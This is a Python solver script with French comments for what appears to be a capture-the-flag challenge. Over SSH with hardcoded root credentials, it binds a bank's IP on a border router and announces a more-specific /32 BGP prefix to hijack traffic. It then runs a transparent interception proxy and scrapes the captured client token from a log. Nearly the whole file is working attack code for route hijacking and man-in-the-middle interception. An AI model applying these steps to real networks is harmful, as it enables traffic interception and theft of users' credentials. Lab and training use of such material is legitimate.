#!/usr/bin/env python3
"""Solveur route-detournee (BGP hijack d'interception transparente).

Depuis le routeur de bordure AS65002 (SSH) :
 1. lier localement l'IP de la banque (198.51.100.10) ;
 2. annoncer en BGP un prefixe PLUS SPECIFIQUE (/32) -> on attire le trafic ;
 3. lancer le proxy d'interception transparent (reemet vers le vrai service via
    le lien lateral 172.16.0.1) ;
 4. lire le jeton intercepte dans les requetes du client.
"""
import re
import sys
import time

import paramiko

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1345

SETUP = r"""
ip link add hj type dummy 2>/dev/null
ip addr add 198.51.100.10/32 dev hj 2>/dev/null
ip link set hj up
vtysh -c 'configure terminal' \
      -c 'router bgp 65002' \
      -c 'address-family ipv4 unicast' \
      -c 'network 198.51.100.10/32' \
      -c 'end' -c 'write memory' >/dev/null 2>&1
pkill -f '^python3 /root/mitm.py' 2>/dev/null
nohup setsid python3 /root/mitm.py > /tmp/intercept.log 2>&1 < /dev/null &
sleep 2
echo "hijack + proxy en place"
"""


def ssh():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username="root", password="Hijack2026")
    return c


def run(c, cmd):
    _, out, err = c.exec_command(cmd)
    return out.read().decode() + err.read().decode()


def main():
    c = ssh()
    print(run(c, SETUP).strip())
    print("attente propagation BGP + prochain battement du client...")
    flag = None
    for _ in range(12):
        time.sleep(5)
        log = run(c, "cat /tmp/intercept.log 2>/dev/null")
        m = re.search(r"FPS\{[^}]+\}", log)
        if m:
            flag = m.group(0)
            break
    c.close()
    print(flag if flag else "echec : rien intercepte")


if __name__ == "__main__":
    main()
